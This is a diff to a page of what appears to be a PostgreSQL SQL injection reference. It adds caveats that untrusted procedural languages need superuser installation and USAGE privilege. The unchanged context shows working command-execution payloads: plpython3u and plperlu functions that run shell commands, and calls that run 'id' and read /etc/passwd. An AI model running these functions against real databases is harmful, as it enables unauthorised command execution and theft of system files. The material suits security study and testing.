@@ -1,7 +1,7 @@
 ---
 title: Privileges
 description: Understanding and checking PostgreSQL privileges for SQL injection attacks
-category: Advanced Techniques
+category: Information Gathering
 order: 15
 tags: ["privileges", "permissions", "superuser"]
 lastUpdated: 2025-12-07
@@ -139,6 +139,8 @@ SELECT * FROM pg_extension WHERE extname IN ('adminpack', 'file_fdw', 'dblink');
 
 Procedural languages determine what code can be executed within PostgreSQL. Untrusted languages (ending in 'u') allow arbitrary code execution.
 
+**Important:** Untrusted languages like `plpython3u`, `plperlu`, and `pltclu` are **not installed by default**. They must be explicitly installed via `CREATE EXTENSION` by a superuser. Additionally, **only superusers can create functions in untrusted languages** unless privileges have been explicitly granted (which is rare and typically a misconfiguration).
+
 **Listing Available Languages:**
 
 ```sql
@@ -180,8 +182,10 @@ WHERE lanpltrusted = false;
 
 **Exploiting Untrusted Languages:**
 
+**Caution:** These examples require: (1) the language extension to be installed (`CREATE EXTENSION plpython3u`), and (2) the current user to have `USAGE` privilege on the language — which by default is restricted to superusers. Check with `has_language_privilege()` before attempting.
+
 ```sql
--- If plpython3u is available
+-- If plpython3u is available and user has USAGE privilege
 CREATE OR REPLACE FUNCTION cmd(c TEXT) RETURNS TEXT AS $$
 import subprocess
 return subprocess.check_output(c, shell=True).decode()
@@ -190,7 +194,7 @@ $$ LANGUAGE plpython3u;
 SELECT cmd('id');
 SELECT cmd('cat /etc/passwd');
 
--- If plperlu is available
+-- If plperlu is available and user has USAGE privilege
 CREATE OR REPLACE FUNCTION cmd(TEXT) RETURNS TEXT AS $$
 my $cmd = shift;
 return `$cmd`;
